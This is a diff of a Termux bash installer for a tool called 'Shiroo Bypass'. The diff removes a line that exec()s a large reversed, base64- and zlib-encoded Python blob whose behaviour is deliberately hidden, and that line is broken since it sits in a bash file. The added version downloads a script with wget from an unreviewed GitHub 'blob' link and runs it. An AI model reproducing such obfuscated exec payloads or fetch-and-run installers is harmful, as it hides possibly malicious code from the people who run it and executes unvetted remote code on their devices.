@@ -1,33 +1,33 @@
 #!/bin/bash
 
-# Update Termux packages
-pkg update -y
-pkg upgrade -y
+# Clear the console
+clear
 
-# Install necessary packages
-pkg install -y python git
+# Print the title
+cat << "EOF"
+  ____  _     _                   ____
+ / ___|| |__ (_)_ __ ___   ___   | __ ) _   _ _ __   __ _ ___ ___
+ \___ \| '_ \| | '__/ _ \ / _ \  |  _ \| | | | '_ \ / _ / __/ __|
+  ___) | | | | | | | (_) | (_) | | |_) | |_| | |_) | (_| \__ \__ \
+ |____/|_| |_|_|_|  \___/ \___/  |____/ \__, | .__/ \__,_|___/___/
+                                        |___/|_|
+                 Made by not.shiroo
+EOF
 
-# Create a project directory and navigate into it
-mkdir -p $HOME/shiroo_bypass
-cd $HOME/shiroo_bypass
+echo "Updating and upgrading packages..."
+pkg update -y && pkg upgrade -y
 
-# Create a virtual environment (optional but recommended)
-python -m venv venv
-source venv/bin/activate
+echo "Installing Python and pip..."
+pkg install python -y
+pkg install python-pip -y
 
-# Create requirements.txt with necessary packages
-echo -e "aiohttp\ntqdm\ncolorama" > requirements.txt
+echo "Installing required Python packages..."
+pip install aiohttp tqdm colorama
 
-# Install required Python packages
-pip install -r requirements.txt
+echo "Downloading the main script..."
+wget https://github.com/shirooscripts/yes/blob/main/shirootool.py -O main_script.py
 
-# Create the usernames.txt file if it doesn't exist
-if [ ! -f usernames.txt ]; then
-  touch usernames.txt
-fi
+echo "Setting up complete. You can now run the tool with: python main_script.py"
 
-# Download the main script
-
-# gago kaba not.shiroo
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+# Run the main script (optional)
+python main_script.py
